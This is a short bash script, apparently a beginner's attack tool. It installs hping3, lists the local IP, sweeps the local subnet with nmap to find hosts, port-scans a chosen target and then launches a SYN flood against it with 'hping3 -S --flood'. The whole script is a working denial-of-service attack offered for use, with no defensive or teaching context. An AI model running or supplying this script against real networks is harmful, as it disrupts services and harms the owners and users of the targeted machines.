#!/bin/bash

sudo apt-get -y update
sudo apt-get install -y  hping3

ifconfig | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep -v 127.0.0.1 | awk '{ print $2 }' | cut -f2 -d:
echo "Enter your ip and replace the last number with * to see the other ips on the same network"
read ip
nmap -sP $ip
echo "Enter the ip you want to attack" 
read ip2
nmap -F $ip2
echo "Now enter its port"
read port
echo "Initiating attack"
sudo hping3 $ip2 -p $port -S --flood

